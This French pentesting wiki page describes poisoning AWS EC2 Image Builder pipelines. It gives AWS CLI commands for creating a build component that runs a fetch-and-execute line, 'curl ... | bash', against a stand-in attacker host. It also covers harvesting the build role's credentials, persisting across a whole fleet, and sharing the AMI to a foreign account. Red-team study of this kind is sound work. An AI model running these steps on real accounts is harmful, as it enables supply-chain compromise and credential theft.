---
order: 6
title: "Image Builder : injecter du code dans les AMI de référence"
description: "Abuser des pipelines et composants EC2 Image Builder pour injecter du code dans les AMI de référence et s'exécuter sous le rôle de build."
keywords:
  - Image Builder
  - pipeline
  - composant
  - AMI
  - rôle de build
---

# Image Builder

EC2 Image Builder exécute des pipelines qui assemblent des AMI de référence et des images de conteneur à partir de **composants** (étapes ordonnées de build et de test). Écrire un composant ou modifier un pipeline injecte votre code dans chaque image que le pipeline produit, et le build lui-même s'exécute sur une instance d'infrastructure sous un rôle de build que vous pouvez récolter.

## Empoisonner un pipeline

```bash
aws imagebuilder list-image-pipelines
aws imagebuilder list-components --owner Self

# Create a component that runs your payload during the build, then add it to the recipe
aws imagebuilder create-component --name x --semantic-version 1.0.0 --platform Linux \
  --data 'name: x
schemaVersion: 1.0
phases:
  - name: build
    steps:
      - name: p
        action: ExecuteBash
        inputs:
          commands: ["curl -s https://you.example/x | bash"]'
```

Exécutez le pipeline (`start-image-pipeline-execution`) pour construire l'image empoisonnée, qui se propage ensuite à tout ce qui est lancé à partir d'elle.

## Notes d'exploitation

- Le build s'exécute sur une instance Image Builder dotée d'un profil d'instance ; votre composant s'exécute sous ce rôle et peut atteindre ses credentials IMDS.
- Chaque hôte lancé depuis l'AMI résultante emporte ce que vous y avez intégré, ce qui transforme une seule écriture en persistance à l'échelle de la flotte. Voir [AMI](ec2/ami.md).
- Modifier la recette ou la configuration de distribution peut aussi partager l'AMI finale vers un compte que vous contrôlez.

## Outils

- **AWS CLI** (`imagebuilder create-component`, `start-image-pipeline-execution`).

## Références

- [HackTricks Cloud: EC2 Image Builder](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/index.html)
- [AWS: Image Builder components](https://docs.aws.amazon.com/imagebuilder/latest/userguide/manage-components.html)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
- [Stratus Red Team: AWS techniques](https://stratus-red-team.cloud/attack-techniques/AWS/)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
